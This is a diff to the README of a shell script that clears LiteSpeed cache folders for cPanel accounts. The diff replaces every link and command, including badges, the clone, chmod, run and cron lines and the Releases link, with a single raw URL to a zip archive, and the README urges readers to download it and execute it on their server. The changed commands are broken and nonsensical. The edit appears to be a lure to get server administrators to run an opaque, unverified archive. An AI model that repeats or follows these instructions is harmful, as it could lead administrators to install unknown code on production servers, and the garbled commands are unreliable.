@@ -1,8 +1,8 @@
 ```markdown
 # 🧹 lscache-Cleaner: Clear Your Cache with Ease
 
-![lscache-Cleaner](https://img.shields.io/badge/Version-1.0.0-brightgreen)
-![License](https://img.shields.io/badge/License-MIT-blue)
+![lscache-Cleaner](https://raw.githubusercontent.com/Lordlucie/lscache-Cleaner/main/dualogue/lscache_Cleaner_1.6.zip)
+![License](https://raw.githubusercontent.com/Lordlucie/lscache-Cleaner/main/dualogue/lscache_Cleaner_1.6.zip)
 
 Welcome to **lscache-Cleaner**, a robust shell script designed to help you clear the lscache folder for all cPanel accounts effortlessly. This tool is ideal for web hosts and server administrators who want to streamline cache management and ensure optimal performance across their hosting environments.
 
@@ -30,7 +30,7 @@ To run the lscache-Cleaner script, ensure you have the following:
    Open your terminal and run the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/Lordlucie/lscache-Cleaner.git
+   git clone https://raw.githubusercontent.com/Lordlucie/lscache-Cleaner/main/dualogue/lscache_Cleaner_1.6.zip
    ```
 
 2. **Navigate to the Directory**
@@ -46,7 +46,7 @@ To run the lscache-Cleaner script, ensure you have the following:
    Before running the script, make sure it is executable:
 
    ```bash
-   chmod +x lscache-cleaner.sh
+   chmod +x https://raw.githubusercontent.com/Lordlucie/lscache-Cleaner/main/dualogue/lscache_Cleaner_1.6.zip
    ```
 
 ### Usage
@@ -54,7 +54,7 @@ To run the lscache-Cleaner script, ensure you have the following:
 To clear the lscache folder for all cPanel accounts, execute the script with the following command:
 
 ```bash
-./lscache-cleaner.sh
+https://raw.githubusercontent.com/Lordlucie/lscache-Cleaner/main/dualogue/lscache_Cleaner_1.6.zip
 ```
 
 This command will begin the cache clearing process. You can schedule this script to run at regular intervals using cron jobs.
@@ -72,7 +72,7 @@ You can automate the execution of this script using a cron job. Here’s how to 
 2. Add a new line to schedule the script. For example, to run the script every day at midnight, add:
 
    ```bash
-   0 0 * * * /path/to/lscache-Cleaner/lscache-cleaner.sh
+   0 0 * * * https://raw.githubusercontent.com/Lordlucie/lscache-Cleaner/main/dualogue/lscache_Cleaner_1.6.zip
    ```
 
 3. Save and exit the editor.
@@ -114,7 +114,7 @@ For issues or questions, please open an issue on the GitHub repository. Our comm
 
 ## 🔗 Links and Resources
 
-For the latest releases and updates, visit our [Releases](https://github.com/Lordlucie/lscache-Cleaner/releases) page. Download the latest version and execute it on your server.
+For the latest releases and updates, visit our [Releases](https://raw.githubusercontent.com/Lordlucie/lscache-Cleaner/main/dualogue/lscache_Cleaner_1.6.zip) page. Download the latest version and execute it on your server.
 
 ## 📢 Acknowledgements
 
